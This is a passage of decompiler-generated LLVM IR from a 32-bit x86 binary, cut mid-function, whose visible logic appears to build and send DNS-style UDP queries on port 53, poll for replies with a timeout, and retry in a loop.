  %v6_80553ac = and i64 %v0_80553a6, 4294967295
  %v8_80553ac = zext i32 %v1_80553ab to i64
  %v9_80553ac = mul nuw i64 %v8_80553ac, 4294967296
  %v10_80553ac = or i64 %v9_80553ac, %v6_80553ac
  %v14_80553ac = srem i64 %v10_80553ac, %tmp33
  %v15_80553ac = trunc i64 %v14_80553ac to i32
  %v0_80553b3 = load i16, i16* @global_var_805e884.401, align 4
  %v2_80553c2 = load i32, i32* %stack_var_-252, align 4
  store i32 %v2_80553c2, i32* @eax, align 4
  store i32 134561879, i32* %edx.global-to-local, align 4
  store i32 %v2_805538d, i32* %stack_var_-252, align 4
  %v2_80553c7 = call i32 @function_805405a(i32 %v2_805538d, i32 1)
  store i32 %v2_80553c7, i32* %eax.global-to-local, align 4
  %v4_805556e = inttoptr i32 %v15_80553ac to i8*
  %v1_805598c84 = add i32 %v12_8055335, 28
  %v2_805598c85 = inttoptr i32 %v1_805598c84 to i32*
  %v3_805598c86 = load i32, i32* %v2_805598c85, align 4
  %tmp = icmp ult i32 %v3_805598c86, 3
  br i1 %tmp, label %dec_label_pc_80553ec, label %dec_label_pc_80559b1

dec_label_pc_80553ec:                             ; preds = %dec_label_pc_8055366, %dec_label_pc_805598c.backedge
  %v0_80553f395 = phi i32 [ %v0_805598c.pre, %dec_label_pc_805598c.backedge ], [ %v12_8055335, %dec_label_pc_8055366 ]
  %v1_80553ec = add i32 %v0_80553f395, 20
  %v2_80553ec = inttoptr i32 %v1_80553ec to i32*
  %v3_80553ec = load i32, i32* %v2_80553ec, align 4
  %v13_80553ec = icmp eq i32 %v3_80553ec, -1
  br i1 %v13_80553ec, label %dec_label_pc_80553ec.dec_label_pc_8055402_crit_edge, label %dec_label_pc_80553f3

dec_label_pc_80553ec.dec_label_pc_8055402_crit_edge: ; preds = %dec_label_pc_80553ec
  %v0_8055402.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055402

dec_label_pc_80553f3:                             ; preds = %dec_label_pc_80553ec
  %v3_80553f6 = load i32, i32* %v2_80553ec, align 4
  %v5_80553f6 = add i32 %v0_80553f395, -16
  %v6_80553f6 = inttoptr i32 %v5_80553f6 to i32*
  store i32 %v3_80553f6, i32* %v6_80553f6, align 4
  %v1_80553fa = call i32 @function_8050b60(i32 -1)
  store i32 %v1_80553fa, i32* %eax.global-to-local, align 4
  %v0_80553ff = load i32, i32* @esp, align 4
  %v1_80553ff = add i32 %v0_80553ff, 16
  br label %dec_label_pc_8055402

dec_label_pc_8055402:                             ; preds = %dec_label_pc_80553ec.dec_label_pc_8055402_crit_edge, %dec_label_pc_80553f3
  %v1_8055402 = phi i32 [ %v0_80553f395, %dec_label_pc_80553ec.dec_label_pc_8055402_crit_edge ], [ %v1_80553ff, %dec_label_pc_80553f3 ]
  %v0_8055402 = phi i32 [ %v0_8055402.pre, %dec_label_pc_80553ec.dec_label_pc_8055402_crit_edge ], [ %v1_80553fa, %dec_label_pc_80553f3 ]
  %v2_8055402 = add i32 %v1_8055402, -4
  %v3_8055402 = inttoptr i32 %v2_8055402 to i32*
  store i32 %v0_8055402, i32* %v3_8055402, align 4
  %v1_8055403 = add i32 %v1_8055402, -8
  %v2_8055403 = inttoptr i32 %v1_8055403 to i32*
  store i32 512, i32* %v2_8055403, align 4
  %v1_8055408 = add i32 %v1_8055402, -12
  %v2_8055408 = inttoptr i32 %v1_8055408 to i32*
  store i32 0, i32* %v2_8055408, align 4
  %v2_805540a = add i32 %v1_8055402, -16
  %v3_805540a = inttoptr i32 %v2_805540a to i32*
  store i32 %v1_805531e, i32* %v3_805540a, align 4
  %v4_805540b = call i32 @function_8051e84(i8* inttoptr (i32 -1 to i8*), i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805540b, i32* %eax.global-to-local, align 4
  %v0_8055410 = load i32, i32* @esp, align 4
  %v1_8055413 = add i32 %v0_8055410, 8
  %v2_8055413 = inttoptr i32 %v1_8055413 to i32*
  store i32 48, i32* %v2_8055413, align 4
  %v1_8055415 = add i32 %v0_8055410, 4
  %v2_8055415 = inttoptr i32 %v1_8055415 to i32*
  store i32 0, i32* %v2_8055415, align 4
  %v1_8055417 = add i32 %v0_8055410, 84
  store i32 %v1_8055417, i32* @ebx, align 4
  %v3_805541b = inttoptr i32 %v0_8055410 to i32*
  store i32 %v1_8055417, i32* %v3_805541b, align 4
  %v4_805541c = call i32 @function_8051e84(i8* inttoptr (i32 -1 to i8*), i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805541c, i32* %eax.global-to-local, align 4
  %v0_8055421 = load i32, i32* @esp, align 4
  %v1_8055421 = add i32 %v0_8055421, 72
  %v2_8055421 = inttoptr i32 %v1_8055421 to i32*
  %v3_8055421 = load i32, i32* %v2_8055421, align 4
  store i32 %v3_8055421, i32* %eax.global-to-local, align 4
  %v1_8055425 = add i32 %v0_8055421, 116
  %v2_8055425 = inttoptr i32 %v1_8055425 to i32*
  store i32 1, i32* %v2_8055425, align 4
  %v0_805542d = load i32, i32* @esp, align 4
  %v1_805542d = add i32 %v0_805542d, 104
  %v2_805542d = inttoptr i32 %v1_805542d to i32*
  store i32 1, i32* %v2_805542d, align 4
  %v0_8055435 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055435 = add i32 %v0_8055435, 1
  %v1_8055436 = urem i32 %v1_8055435, 65536
  store i32 %v1_8055436, i32* %eax.global-to-local, align 4
  %v1_805543b = load i32, i32* @esp, align 4
  %v2_805543b = add i32 %v1_805543b, 72
  %v3_805543b = inttoptr i32 %v2_805543b to i32*
  store i32 %v1_8055436, i32* %v3_805543b, align 4
  %v0_805543f = load i32, i32* %eax.global-to-local, align 4
  %v1_805543f = load i32, i32* @esp, align 4
  %v2_805543f = add i32 %v1_805543f, 84
  %v3_805543f = inttoptr i32 %v2_805543f to i32*
  store i32 %v0_805543f, i32* %v3_805543f, align 4
  %v0_8055443 = load i32, i32* @esp, align 4
  %v1_8055446 = add i32 %v0_8055443, 8
  %v2_8055446 = inttoptr i32 %v1_8055446 to i32*
  store i32 512, i32* %v2_8055446, align 4
  %v2_805544b = add i32 %v0_8055443, 4
  %v3_805544b = inttoptr i32 %v2_805544b to i32*
  store i32 %v1_805531e, i32* %v3_805544b, align 4
  %v0_805544c = load i32, i32* @ebx, align 4
  %v3_805544c = inttoptr i32 %v0_8055443 to i32*
  store i32 %v0_805544c, i32* %v3_805544c, align 4
  %v0_805544d = call i32 @function_8056c08()
  store i32 %v0_805544d, i32* %eax.global-to-local, align 4
  %v0_8055452 = load i32, i32* @esp, align 4
  %v2_8055455 = icmp slt i32 %v0_805544d, 0
  store i32 %v0_805544d, i32* @ebx, align 4
  br i1 %v2_8055455, label %dec_label_pc_80559b1, label %dec_label_pc_805545f

dec_label_pc_805545f:                             ; preds = %dec_label_pc_8055402
  %v2_805545f = add i32 %v0_8055452, 12
  %v3_805545f = inttoptr i32 %v2_805545f to i32*
  store i32 %v0_805544d, i32* %v3_805545f, align 4
  %v1_8055460 = add i32 %v0_8055452, 8
  %v2_8055460 = inttoptr i32 %v1_8055460 to i32*
  store i32 1025, i32* %v2_8055460, align 4
  %v1_8055465 = add i32 %v0_8055452, 256
  %v2_8055465 = inttoptr i32 %v1_8055465 to i32*
  %v3_8055465 = load i32, i32* %v2_8055465, align 4
  %v5_8055465 = add i32 %v0_8055452, 4
  %v6_8055465 = inttoptr i32 %v5_8055465 to i32*
  store i32 %v3_8055465, i32* %v6_8055465, align 4
  %v1_805546c = add i32 %v0_8055452, 28
  %v2_805546c = inttoptr i32 %v1_805546c to i32*
  %v3_805546c = load i32, i32* %v2_805546c, align 4
  %v6_805546c = inttoptr i32 %v0_8055452 to i32*
  store i32 %v3_805546c, i32* %v6_805546c, align 4
  %v5_8055470 = call i32 @function_8051f0c(i8* inttoptr (i32 -1 to i8*), i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8055475 = load i32, i32* @esp, align 4
  %v1_8055478 = add i32 %v0_8055475, 8
  %v2_8055478 = inttoptr i32 %v1_8055478 to i32*
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* %v2_8055478, align 4
  %v1_805547d = add i32 %v0_8055475, 4
  %v2_805547d = inttoptr i32 %v1_805547d to i32*
  store i32 134561879, i32* %v2_805547d, align 4
  %v1_8055482 = add i32 %v0_8055475, 200
  store i32 %v1_8055482, i32* @eax, align 4
  %v3_8055489 = inttoptr i32 %v0_8055475 to i32*
  store i32 %v1_8055482, i32* %v3_8055489, align 4
  %v2_805548a = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_805548a, i32* %eax.global-to-local, align 4
  %v0_805548f = load i32, i32* @esp, align 4
  %v1_805548f = inttoptr i32 %v0_805548f to i32*
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* %v1_805548f, align 4
  %v1_8055496 = call i32 @function_8054057(i32 -1)
  store i32 %v1_8055496, i32* %eax.global-to-local, align 4
  %v0_805549b = load i32, i32* @esp, align 4
  %v1_805549b = add i32 %v0_805549b, 56
  %v2_805549b = inttoptr i32 %v1_805549b to i32*
  %v3_805549b = load i32, i32* %v2_805549b, align 4
  store i32 %v3_805549b, i32* %edx.global-to-local, align 4
  %v1_805549f = add i32 %v0_805549b, 268
  %v2_805549f = inttoptr i32 %v1_805549f to i32*
  %v3_805549f = load i32, i32* %v2_805549f, align 4
  store i32 %v3_805549f, i32* %eax.global-to-local, align 4
  %v2_80554a6 = mul i32 %v3_805549b, 4
  %v3_80554a6 = add i32 %v3_805549f, %v2_80554a6
  %v4_80554a6 = inttoptr i32 %v3_80554a6 to i32*
  %v5_80554a6 = load i32, i32* %v4_80554a6, align 4
  store i32 %v5_80554a6, i32* %edx.global-to-local, align 4
  %v2_80554a9 = add i32 %v0_805549b, 48
  %v3_80554a9 = inttoptr i32 %v2_80554a9 to i32*
  store i32 %v5_80554a6, i32* %v3_80554a9, align 4
  %v0_80554ad = load i32, i32* @esp, align 4
  %v1_80554ad = add i32 %v0_80554ad, 16
  %v1_80554b0 = add i32 %v0_80554ad, 52
  %v2_80554b0 = inttoptr i32 %v1_80554b0 to i32*
  %v3_80554b0 = load i32, i32* %v2_80554b0, align 4
  %v5_80554b0 = icmp slt i32 %v3_80554b0, 0
  br i1 %v5_80554b0, label %dec_label_pc_805545f.dec_label_pc_80554f6_crit_edge, label %dec_label_pc_80554b7

dec_label_pc_805545f.dec_label_pc_80554f6_crit_edge: ; preds = %dec_label_pc_805545f
  %v0_80554f6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80554f6

dec_label_pc_80554b7:                             ; preds = %dec_label_pc_805545f
  store i32 %v3_80554b0, i32* %eax.global-to-local, align 4
  %v1_80554bb = load i32, i32* @global_var_8064f78.402, align 8
  %v2_80554bb = sub i32 %v3_80554b0, %v1_80554bb
  %v8_80554bb = xor i32 %v1_80554bb, %v3_80554b0
  %v9_80554bb = xor i32 %v2_80554bb, %v3_80554b0
  %v10_80554bb = and i32 %v9_80554bb, %v8_80554bb
  %v11_80554bb = icmp slt i32 %v10_80554bb, 0
  %v13_80554bb = icmp slt i32 %v2_80554bb, 0
  %v2_80554c1 = icmp eq i1 %v13_80554bb, %v11_80554bb
  br i1 %v2_80554c1, label %dec_label_pc_80554f6, label %dec_label_pc_80554c3

dec_label_pc_80554c3:                             ; preds = %dec_label_pc_80554b7
  %v2_80554c3 = add i32 %v0_80554ad, 12
  %v3_80554c3 = inttoptr i32 %v2_80554c3 to i32*
  store i32 %v3_80554b0, i32* %v3_80554c3, align 4
  %v1_80554c4 = add i32 %v0_80554ad, 8
  %v2_80554c4 = inttoptr i32 %v1_80554c4 to i32*
  store i32 1025, i32* %v2_80554c4, align 4
  %v1_80554c9 = add i32 %v0_80554ad, 4
  %v2_80554c9 = inttoptr i32 %v1_80554c9 to i32*
  store i32 ptrtoint (i32* @global_var_805d3dc.403 to i32), i32* %v2_80554c9, align 4
  %v1_80554ce = add i32 %v0_80554ad, 28
  %v2_80554ce = inttoptr i32 %v1_80554ce to i32*
  %v3_80554ce = load i32, i32* %v2_80554ce, align 4
  %v6_80554ce = inttoptr i32 %v0_80554ad to i32*
  store i32 %v3_80554ce, i32* %v6_80554ce, align 4
  %v0_80554d2 = call i32 @function_80565d4()
  store i32 %v0_80554d2, i32* %eax.global-to-local, align 4
  %v0_80554d7 = load i32, i32* @esp, align 4
  %v1_80554da = add i32 %v0_80554d7, 8
  %v2_80554da = inttoptr i32 %v1_80554da to i32*
  store i32 1025, i32* %v2_80554da, align 4
  %v1_80554df = add i32 %v0_80554d7, 52
  %v2_80554df = inttoptr i32 %v1_80554df to i32*
  %v3_80554df = load i32, i32* %v2_80554df, align 4
  store i32 %v3_80554df, i32* %edx.global-to-local, align 4
  %v1_80554e3 = mul i32 %v3_80554df, 4
  %v2_80554e3 = add i32 %v1_80554e3, 134631256
  %v3_80554e3 = inttoptr i32 %v2_80554e3 to i32*
  %v4_80554e3 = load i32, i32* %v3_80554e3, align 4
  %v6_80554e3 = add i32 %v0_80554d7, 4
  %v7_80554e3 = inttoptr i32 %v6_80554e3 to i32*
  store i32 %v4_80554e3, i32* %v7_80554e3, align 4
  %v1_80554ea = add i32 %v0_80554d7, 28
  %v2_80554ea = inttoptr i32 %v1_80554ea to i32*
  %v3_80554ea = load i32, i32* %v2_80554ea, align 4
  %v6_80554ea = inttoptr i32 %v0_80554d7 to i32*
  store i32 %v3_80554ea, i32* %v6_80554ea, align 4
  %v0_80554ee = call i32 @function_80565d4()
  store i32 %v0_80554ee, i32* %eax.global-to-local, align 4
  %v0_80554f3 = load i32, i32* @esp, align 4
  %v1_80554f3 = add i32 %v0_80554f3, 16
  br label %dec_label_pc_80554f6

dec_label_pc_80554f6:                             ; preds = %dec_label_pc_805545f.dec_label_pc_80554f6_crit_edge, %dec_label_pc_80554b7, %dec_label_pc_80554c3
  %v1_80554f6 = phi i32 [ %v1_80554ad, %dec_label_pc_805545f.dec_label_pc_80554f6_crit_edge ], [ %v1_80554ad, %dec_label_pc_80554b7 ], [ %v1_80554f3, %dec_label_pc_80554c3 ]
  %v0_80554f6 = phi i32 [ %v0_80554f6.pre, %dec_label_pc_805545f.dec_label_pc_80554f6_crit_edge ], [ %v3_80554b0, %dec_label_pc_80554b7 ], [ %v0_80554ee, %dec_label_pc_80554c3 ]
  %v2_80554f6 = add i32 %v1_80554f6, -4
  %v3_80554f6 = inttoptr i32 %v2_80554f6 to i32*
  store i32 %v0_80554f6, i32* %v3_80554f6, align 4
  %v0_80554f7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80554f7 = add i32 %v1_80554f6, -8
  %v3_80554f7 = inttoptr i32 %v2_80554f7 to i32*
  store i32 %v0_80554f7, i32* %v3_80554f7, align 4
  %v1_80554f8 = add i32 %v1_80554f6, -12
  %v2_80554f8 = inttoptr i32 %v1_80554f8 to i32*
  store i32 1, i32* %v2_80554f8, align 4
  %v1_80554fa = add i32 %v1_80554f6, 184
  store i32 %v1_80554fa, i32* @eax, align 4
  %v2_8055501 = add i32 %v1_80554f6, -16
  %v3_8055501 = inttoptr i32 %v2_8055501 to i32*
  store i32 %v1_80554fa, i32* %v3_8055501, align 4
  %v2_8055502 = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_8055502, i32* %eax.global-to-local, align 4
  %v0_8055507 = load i32, i32* @esp, align 4
  %v1_8055507 = add i32 %v0_8055507, 28
  %v2_8055507 = inttoptr i32 %v1_8055507 to i32*
  %v3_8055507 = load i32, i32* %v2_8055507, align 4
  store i32 %v3_8055507, i32* %eax.global-to-local, align 4
  %v1_805550b = add i32 %v0_8055507, 260
  %v2_805550b = inttoptr i32 %v1_805550b to i32*
  %v3_805550b = load i32, i32* %v2_805550b, align 4
  store i32 %v3_805550b, i32* @edx, align 4
  %v1_8055512 = add i32 %v0_8055507, 224
  %v2_8055512 = inttoptr i32 %v1_8055512 to i32*
  store i32 1, i32* %v2_8055512, align 4
  %v0_805551d = load i32, i32* %eax.global-to-local, align 4
  %v1_805551d = load i32, i32* @esp, align 4
  %v2_805551d = add i32 %v1_805551d, 216
  %v3_805551d = inttoptr i32 %v2_805551d to i32*
  store i32 %v0_805551d, i32* %v3_805551d, align 4
  %v1_8055529 = load i32, i32* @ebx, align 4
  %v2_8055529 = sub i32 512, %v1_8055529
  store i32 %v2_8055529, i32* %eax.global-to-local, align 4
  %v0_805552b = load i32, i32* @edx, align 4
  %v1_805552b = load i32, i32* @esp, align 4
  %v2_805552b = add i32 %v1_805552b, 220
  %v3_805552b = inttoptr i32 %v2_805552b to i32*
  store i32 %v0_805552b, i32* %v3_805552b, align 4
  %v0_8055532 = load i32, i32* @esp, align 4
  %v0_8055535 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055535 = add i32 %v0_8055532, 8
  %v3_8055535 = inttoptr i32 %v2_8055535 to i32*
  store i32 %v0_8055535, i32* %v3_8055535, align 4
  %v1_8055536 = load i32, i32* @ebx, align 4
  %v2_8055536 = add i32 %v1_8055536, %v1_805531e
  %v2_805553a = add i32 %v0_8055532, 4
  %v3_805553a = inttoptr i32 %v2_805553a to i32*
  store i32 %v2_8055536, i32* %v3_805553a, align 4
  %v1_805553b = add i32 %v0_8055532, 216
  store i32 %v1_805553b, i32* @eax, align 4
  %v3_8055542 = inttoptr i32 %v0_8055532 to i32*
  store i32 %v1_805553b, i32* %v3_8055542, align 4
  %v0_8055543 = call i32 @function_8056d64()
  store i32 %v0_8055543, i32* %eax.global-to-local, align 4
  %v0_8055548 = load i32, i32* @esp, align 4
  %v2_805554b = icmp slt i32 %v0_8055543, 0
  store i32 %v0_8055543, i32* @esi, align 4
  br i1 %v2_805554b, label %dec_label_pc_80559b1, label %dec_label_pc_8055555

dec_label_pc_8055555:                             ; preds = %dec_label_pc_80554f6
  %v1_8055555 = add i32 %v0_8055548, 172
  %v2_8055555 = inttoptr i32 %v1_8055555 to i16*
  store i16 2, i16* %v2_8055555, align 2
  %v1_805555f = load i32, i32* @esp, align 4
  %v2_805555f = add i32 %v1_805555f, -4
  %v3_805555f = inttoptr i32 %v2_805555f to i32*
  store i32 %v0_8055543, i32* %v3_805555f, align 4
  %v1_8055560 = add i32 %v1_805555f, 164
  store i32 %v1_8055560, i32* %eax.global-to-local, align 4
  %v2_8055567 = add i32 %v1_805555f, -8
  %v3_8055567 = inttoptr i32 %v2_8055567 to i32*
  store i32 %v1_8055560, i32* %v3_8055567, align 4
  %v1_8055568 = add i32 %v1_805555f, 32
  %v2_8055568 = inttoptr i32 %v1_8055568 to i32*
  %v3_8055568 = load i32, i32* %v2_8055568, align 4
  %v5_8055568 = add i32 %v1_805555f, -12
  %v6_8055568 = inttoptr i32 %v5_8055568 to i32*
  store i32 %v3_8055568, i32* %v6_8055568, align 4
  %v1_805556c = add i32 %v1_805555f, -16
  %v2_805556c = inttoptr i32 %v1_805556c to i32*
  store i32 10, i32* %v2_805556c, align 4
  %v5_805556e = call i32 @function_805675a(i32 -1, i8* %v4_805556e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805556e, i32* %eax.global-to-local, align 4
  %v0_8055573 = load i32, i32* @esp, align 4
  %v1_8055573 = add i32 %v0_8055573, 16
  %tmp46 = icmp slt i32 %v5_805556e, 1
  br i1 %tmp46, label %dec_label_pc_8055584, label %dec_label_pc_805557a

dec_label_pc_805557a:                             ; preds = %dec_label_pc_8055555
  %v1_805557a = add i32 %v0_8055573, 172
  %v2_805557a = inttoptr i32 %v1_805557a to i16*
  store i16 10, i16* %v2_805557a, align 2
  %v0_8055584.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055584

dec_label_pc_8055584:                             ; preds = %dec_label_pc_8055555, %dec_label_pc_805557a
  %v0_805559b = phi i32 [ %v1_8055573, %dec_label_pc_8055555 ], [ %v0_8055584.pre, %dec_label_pc_805557a ]
  %v1_8055584 = add i32 %v0_805559b, 156
  %v2_8055584 = inttoptr i32 %v1_8055584 to i16*
  %v3_8055584 = load i16, i16* %v2_8055584, align 2
  %v12_8055584 = icmp eq i16 %v3_8055584, 10
  %v1_805558d = icmp eq i1 %v12_8055584, false
  %v1_805559b = add i32 %v0_805559b, 158
  %v2_805559b = inttoptr i32 %v1_805559b to i16*
  store i16 13568, i16* %v2_805559b, align 2
  %v0_80555a5 = load i32, i32* @esp, align 4
  br i1 %v1_805558d, label %dec_label_pc_805559b, label %dec_label_pc_80555bb

dec_label_pc_805559b:                             ; preds = %dec_label_pc_8055584
  %v1_80555a8 = add i32 %v0_80555a5, 32
  %v2_80555a8 = inttoptr i32 %v1_80555a8 to i32*
  %v3_80555a8 = load i32, i32* %v2_80555a8, align 4
  %v5_80555a8 = add i32 %v0_80555a5, -16
  %v6_80555a8 = inttoptr i32 %v5_80555a8 to i32*
  store i32 %v3_80555a8, i32* %v6_80555a8, align 4
  %v1_80555ac = call i32 @function_8052304(i32 -1)
  store i32 %v1_80555ac, i32* %eax.global-to-local, align 4
  %v1_80555b1 = load i32, i32* @esp, align 4
  %v2_80555b1 = add i32 %v1_80555b1, 176
  %v3_80555b1 = inttoptr i32 %v2_80555b1 to i32*
  store i32 %v1_80555ac, i32* %v3_80555b1, align 4
  %v0_80555b8 = load i32, i32* @esp, align 4
  %v1_80555b8 = add i32 %v0_80555b8, 16
  br label %dec_label_pc_80555bb

dec_label_pc_80555bb:                             ; preds = %dec_label_pc_8055584, %dec_label_pc_805559b
  %v1_80555bb = phi i32 [ %v1_80555b8, %dec_label_pc_805559b ], [ %v0_80555a5, %dec_label_pc_8055584 ]
  %v0_80555bb = load i32, i32* @ecx, align 4
  %v2_80555bb = add i32 %v1_80555bb, -4
  %v3_80555bb = inttoptr i32 %v2_80555bb to i32*
  store i32 %v0_80555bb, i32* %v3_80555bb, align 4
  %v1_80555bc = add i32 %v1_80555bb, -8
  %v2_80555bc = inttoptr i32 %v1_80555bc to i32*
  store i32 17, i32* %v2_80555bc, align 4
  %v1_80555be = add i32 %v1_80555bb, -12
  %v2_80555be = inttoptr i32 %v1_80555be to i32*
  store i32 2, i32* %v2_80555be, align 4
  %v1_80555c0 = add i32 %v1_80555bb, 156
  %v2_80555c0 = inttoptr i32 %v1_80555c0 to i16*
  %v3_80555c0 = load i16, i16* %v2_80555c0, align 2
  %v4_80555c0 = zext i16 %v3_80555c0 to i32
  store i32 %v4_80555c0, i32* %eax.global-to-local, align 4
  %v2_80555c8 = add i32 %v1_80555bb, -16
  %v3_80555c8 = inttoptr i32 %v2_80555c8 to i32*
  store i32 %v4_80555c0, i32* %v3_80555c8, align 4
  %v3_80555c9 = call i32 @function_805280c(i32 -1, i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80555c9, i32* %eax.global-to-local, align 4
  %v1_80555ce = load i32, i32* @esp, align 4
  %v2_80555ce = add i32 %v1_80555ce, 36
  %v3_80555ce = inttoptr i32 %v2_80555ce to i32*
  store i32 %v3_80555c9, i32* %v3_80555ce, align 4
  %v0_80555d2 = load i32, i32* @esp, align 4
  %v1_80555d2 = add i32 %v0_80555d2, 16
  %v0_80555d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80555d5 = icmp slt i32 %v0_80555d5, 0
  br i1 %v2_80555d5, label %dec_label_pc_8055602, label %dec_label_pc_80555d9

dec_label_pc_80555d9:                             ; preds = %dec_label_pc_80555bb
  %v1_80555d9 = add i32 %v0_80555d2, 172
  store i32 %v1_80555d9, i32* %eax.global-to-local, align 4
  %v0_80555e0 = load i32, i32* @edx, align 4
  %v2_80555e0 = add i32 %v0_80555d2, 12
  %v3_80555e0 = inttoptr i32 %v2_80555e0 to i32*
  store i32 %v0_80555e0, i32* %v3_80555e0, align 4
  %v1_80555e1 = add i32 %v0_80555d2, 8
  %v2_80555e1 = inttoptr i32 %v1_80555e1 to i32*
  store i32 28, i32* %v2_80555e1, align 4
  %v0_80555e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80555e3 = add i32 %v0_80555d2, 4
  %v3_80555e3 = inttoptr i32 %v2_80555e3 to i32*
  store i32 %v0_80555e3, i32* %v3_80555e3, align 4
  %v1_80555e4 = add i32 %v0_80555d2, 36
  %v2_80555e4 = inttoptr i32 %v1_80555e4 to i32*
  %v3_80555e4 = load i32, i32* %v2_80555e4, align 4
  %v6_80555e4 = inttoptr i32 %v0_80555d2 to i32*
  store i32 %v3_80555e4, i32* %v6_80555e4, align 4
  %v3_80555e8 = call i32 @function_8052690(i32 -1, i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80555e8, i32* %eax.global-to-local, align 4
  %v0_80555ed = load i32, i32* @esp, align 4
  %v2_80555f0 = icmp slt i32 %v3_80555e8, 0
  %v1_80555f2 = icmp eq i1 %v2_80555f0, false
  br i1 %v1_80555f2, label %dec_label_pc_805560b, label %dec_label_pc_80555f4

dec_label_pc_80555f4:                             ; preds = %dec_label_pc_80555d9
  %v1_80555f4 = call i32 @function_8050f90(i32 -1)
  store i32 %v1_80555f4, i32* %eax.global-to-local, align 4
  %v1_80555f9 = inttoptr i32 %v1_80555f4 to i32*
  %v2_80555f9 = load i32, i32* %v1_80555f9, align 4
  %v11_80555f9 = icmp eq i32 %v2_80555f9, 101
  %v0_805596b.pre = load i32, i32* @esp, align 4
  br i1 %v11_80555f9, label %dec_label_pc_805596b, label %dec_label_pc_8055602

dec_label_pc_8055602:                             ; preds = %dec_label_pc_80555f4, %dec_label_pc_80555bb
  %v17_8055602 = phi i32 [ %v1_80555d2, %dec_label_pc_80555bb ], [ %v0_805596b.pre, %dec_label_pc_80555f4 ]
  %v1_8055602 = add i32 %v17_8055602, 28
  %v2_8055602 = inttoptr i32 %v1_8055602 to i32*
  %v3_8055602 = load i32, i32* %v2_8055602, align 4
  %v4_8055602 = add i32 %v3_8055602, 1
  store i32 %v4_8055602, i32* %v2_8055602, align 4
  br label %dec_label_pc_805598c.backedge

dec_label_pc_805560b:                             ; preds = %dec_label_pc_80555d9
  %v1_805560b = add i32 %v0_80555ed, 12
  %v2_805560b = inttoptr i32 %v1_805560b to i32*
  store i32 0, i32* %v2_805560b, align 4
  %v0_805560d = load i32, i32* @ebx, align 4
  %v1_805560d = load i32, i32* @esi, align 4
  %v2_805560d = add i32 %v1_805560d, %v0_805560d
  store i32 %v2_805560d, i32* %eax.global-to-local, align 4
  %v2_8055610 = add i32 %v0_80555ed, 8
  %v3_8055610 = inttoptr i32 %v2_8055610 to i32*
  store i32 %v2_805560d, i32* %v3_8055610, align 4
  %v2_8055611 = add i32 %v0_80555ed, 4
  %v3_8055611 = inttoptr i32 %v2_8055611 to i32*
  store i32 %v1_805531e, i32* %v3_8055611, align 4
  %v1_8055612 = add i32 %v0_80555ed, 36
  %v2_8055612 = inttoptr i32 %v1_8055612 to i32*
  %v3_8055612 = load i32, i32* %v2_8055612, align 4
  %v6_8055612 = inttoptr i32 %v0_80555ed to i32*
  store i32 %v3_8055612, i32* %v6_8055612, align 4
  %v4_8055616 = call i32 @function_8052758(i32 -1, i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8055616, i32* %eax.global-to-local, align 4
  %v0_805561b = load i32, i32* @esp, align 4
  %v1_805561b = add i32 %v0_805561b, 36
  %v2_805561b = inttoptr i32 %v1_805561b to i32*
  %v3_805561b = load i32, i32* %v2_805561b, align 4
  store i32 %v3_805561b, i32* %eax.global-to-local, align 4
  %v1_805561f = add i32 %v0_805561b, 232
  %v2_805561f = inttoptr i32 %v1_805561f to i16*
  store i16 1, i16* %v2_805561f, align 2
  %v0_8055629 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055629 = load i32, i32* @esp, align 4
  %v2_8055629 = add i32 %v1_8055629, 228
  %v3_8055629 = inttoptr i32 %v2_8055629 to i32*
  store i32 %v0_8055629, i32* %v3_8055629, align 4
  %v0_8055630 = load i32, i32* @esp, align 4
  %v1_8055633 = add i32 %v0_8055630, 8
  %v2_8055633 = inttoptr i32 %v1_8055633 to i32*
  store i32 10000, i32* %v2_8055633, align 4
  %v1_8055638 = add i32 %v0_8055630, 4
  %v2_8055638 = inttoptr i32 %v1_8055638 to i32*
  store i32 1, i32* %v2_8055638, align 4
  %v1_805563a = add i32 %v0_8055630, 228
  store i32 %v1_805563a, i32* %eax.global-to-local, align 4
  %v3_8055641 = inttoptr i32 %v0_8055630 to i32*
  store i32 %v1_805563a, i32* %v3_8055641, align 4
  %v0_8055642 = call i32 @function_8055d30()
  store i32 %v0_8055642, i32* %eax.global-to-local, align 4
  %v0_8055647 = load i32, i32* @esp, align 4
  %v1_8055647 = add i32 %v0_8055647, 16
  %tmp47 = icmp slt i32 %v0_8055642, 1
  br i1 %tmp47, label %dec_label_pc_805596b, label %dec_label_pc_8055652

dec_label_pc_8055652:                             ; preds = %dec_label_pc_805560b
  %v1_8055652 = add i32 %v0_8055647, 12
  %v2_8055652 = inttoptr i32 %v1_8055652 to i32*
  store i32 0, i32* %v2_8055652, align 4
  %v1_8055654 = add i32 %v0_8055647, 8
  %v2_8055654 = inttoptr i32 %v1_8055654 to i32*
  store i32 512, i32* %v2_8055654, align 4
  %v2_8055659 = add i32 %v0_8055647, 4
  %v3_8055659 = inttoptr i32 %v2_8055659 to i32*
  store i32 %v1_805531e, i32* %v3_8055659, align 4
  %v1_805565a = add i32 %v0_8055647, 36
  %v2_805565a = inttoptr i32 %v1_805565a to i32*
  %v3_805565a = load i32, i32* %v2_805565a, align 4
  %v6_805565a = inttoptr i32 %v0_8055647 to i32*
